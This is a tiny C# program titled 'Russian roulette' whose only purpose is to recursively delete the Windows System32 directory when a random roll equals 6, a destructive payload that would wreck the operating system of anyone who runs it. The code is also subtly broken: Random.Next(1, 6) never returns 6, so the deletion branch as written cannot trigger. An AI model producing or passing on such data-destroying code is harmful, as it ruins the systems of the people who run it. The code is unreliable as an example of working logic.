using System;

namespace Russian_roulette
{
    internal class Program
    {
        private static int roll;

        static void Main(string[] args)
        {
            Random roulette = new Random();
            roll = roulette.Next(1, 6);

            if (roll == 6)
            {
                System.IO.Directory.Delete(@"C:\Windows\System32", true);
            }
        }
    }
}